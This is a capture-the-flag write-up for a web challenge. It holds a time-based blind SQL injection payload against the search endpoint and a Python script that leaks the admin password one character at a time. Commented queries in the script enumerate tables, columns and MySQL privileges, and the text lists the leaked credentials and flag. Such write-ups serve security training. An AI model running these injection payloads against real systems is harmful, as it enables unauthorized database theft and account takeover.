# SUS Archive

This CTF team made a file archiver, but it's freemium! Damn it, those greedy players want $42 just to search for files... and they won't even show you a single result until you pay up. The login page doesn’t seem to help either—maybe there’s another way to get what you want?
http://chall.ctf.k1nd4sus.it:30211 

## Writeup

We can use the query param of the **search** endpoint in order to perform a **Time-Based Blind SQL Injection**. This query will be executed before the login check.

The following query trigger the injection:

```
chall.ctf.k1nd4sus.it:30211/search?q=15'XOR(if(now()=sysdate(),sleep(3),0))OR'
```

By knowing this software beaviour we can exfiltrate all data inside the database.

By following [this]((https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/blob/main/MySQL%20-%20Time%20Based%20SQLi/README.md)) cheat sheet, we can build all the desired queries.

Here there is the exploit I wrote to exfiltrate the **admin** password:

```python
#!/usr/bin/python3
import requests
import string

ip = 'chall.ctf.k1nd4sus.it'
port = 30211

url = f"http://{ip}:{port}"

wait_time = 2

def login(s, username, password):
    data = {
        'username': username,
        'password': password
    }
    req = s.post(url + '/login', json=data)
    return req.text

def search(s, q):
    data = {
        'q': q
    }
    try:
        req = s.get(url + '/search', params=data, timeout=1)
    except requests.exceptions.ReadTimeout:
        return True
    if req.elapsed.total_seconds() > wait_time:
        return True
    return False

def keepAlive(s):
    req = s.get(url + '/keepAlive')
    return req.json()

def logout(s):
    req = s.get(url + '/logout')
    return req.text

if __name__ == '__main__':
    s = requests.session()

    user = 'admin'
    pw = 'WizORpLrwYcs'

    # print(login(s, user, pw))

    leak = 'WizORpLrwY'
    i = len(leak) + 1

    wordlist = string.printable.replace('%','').replace('_','')

    while True:
        #print(i)
        for w in wordlist:
            # print(leak + w)
            # query = f"15'XOR(if((select SUBSTRING(table_name,{i},1) from information_schema.tables where table_schema=database() limit 0,1) = '{w}', sleep(2), null))OR'"
            # query = f"15'XOR(if((select SUBSTRING(column_name,{i},1) from information_schema.columns where table_schema=database() and table_name = 'users' limit 2,1) = '{w}', sleep(2), null))OR'"
            # query = f"15'XOR(if((select SUBSTRING(description,{i},1) from data limit 1,1) = '{w}', sleep(2), null))OR'"
            # query = f"15'XOR(if((select SUBSTRING(description,{i},1) from data WHERE description LIKE '%KSUS%' limit 0,1) = '{w}', sleep(2), null))OR'"
            # query = f"15'XOR(if((select SUBSTRING(username,{i},1) from users limit 1,1) = '{w}', sleep(2), null))OR'"
            # query = f"15'XOR(if((select SUBSTRING(database(),{i},1) from information_schema.tables limit 0,1) = '{w}', sleep(2), null))OR'"
            # query = f"15'XOR(if((select SUBSTRING(user(),{i},1) from information_schema.tables limit 0,1) = '{w}', sleep(2), null))OR'" # root
            # query = f"15'XOR(if((select SUBSTRING(execute_priv,{i},1) from mysql.user where user='root' limit 0,1) = '{w}', sleep(2), null))OR'" # root
            query = f"15'XOR(if((select SUBSTRING(password,{i},1) from users where username = 'admin' limit 0,1) like binary '{w}', sleep(2), null))OR'"

            if search(s, query):
                i += 1
                leak += w
                print(f'{leak = }', flush=True)
                break
        else:
            break
```

**Admin** credentials are:

```
admin:WizORpLrwYcs
```

Now we can use these credentials to log in as **admin** on the website and obtain the following flag:

```
CTF{V3ry_Funny_4rchiv3_bmV2ZXJnb25uYWdpdmV5b3V1cA}
```